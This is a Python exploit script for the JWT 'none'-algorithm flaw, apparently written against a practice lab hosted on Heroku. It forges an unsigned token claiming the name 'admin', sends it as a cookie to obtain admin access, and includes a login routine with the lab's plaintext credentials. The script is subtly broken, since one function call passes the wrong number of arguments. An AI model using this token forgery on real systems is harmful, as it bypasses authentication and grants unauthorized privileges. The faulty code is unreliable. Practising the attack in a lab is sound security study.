#!/usr/bin/python3

import requests
import sys
import jwt
import base64

from bs4 import BeautifulSoup

def login(url, endpoint, username, password):

    s = requests.session()
    r = s.get(url + endpoint)
    p = BeautifulSoup(r.content, "lxml")
    auth_token = p.find(attrs = {'name' : 'authenticity_token'})['value']

    data = {
        'authenticity_token': auth_token,
        'session[name]': username,
        'session[password]': password,
        'commit': 'Log+In',
    }

    # Capturing the JWT token
    r = s.post(url + endpoint, data=data)#, allow_redirects=False)
    if r.status_code == 200 and username in r.text:
        print(f"[INFO] Successfully login as {username}")
    else:
        print("[ERROR] Something went wrong!")
        sys.exit(1)

    # Parsing JWT Token from cookies
    p = BeautifulSoup(r.content, "html.parser")
    try:
        cookie = requests.utils.dict_from_cookiejar(s.cookies)
        jwt_token = cookie['challenge']
        print(f"[INFO] JWT Token: {jwt_token}")

        new_admin_jwt_token = jwt_handle()
        print(f"[INFO] New JWT Token (None): {new_admin_jwt_token}")

        admin_login(s, new_admin_jwt_token, url, endpoint)
    except:
        print("[ERROR] Something went wrong!")
        sys.exit(1)

    return jwt_token

def jwt_handle():

    # # Token Parse
    # token_head = jwt_token.split(".")[0]
    # token_payload = jwt_token.split(".")[1]
    # token_secret = jwt_token.split(".")[2]

    none_head = b'{"alg": "None"}'
    admin_payload = b'{"name": "admin"}'

    none_head_b64encode = base64.b64encode(none_head)
    admin_payload_b64encode = base64.b64encode(admin_payload)
    new_admin_jwt_token = none_head_b64encode.decode("utf-8") + "." + admin_payload_b64encode.decode("utf-8") + "."

    return new_admin_jwt_token

def admin_login(new_admin_jwt_token, url, endpoint):

    cookies = {
        "challenge": new_admin_jwt_token,
    }

    r = requests.get(url + endpoint, cookies=cookies)
    print(r.text)



if __name__ == '__main__':
    url = "https://jwt-lab.herokuapp.com"
    endpoint = "/authentication/none"

    username = "bigb0ss"
    password = "password"

    #login(url, endpoint, username, password)
    new_admin_jwt_token = jwt_handle()
    print(f"[INFO] New JWT Token (None): {new_admin_jwt_token}")

    admin_login(new_admin_jwt_token, url, endpoint)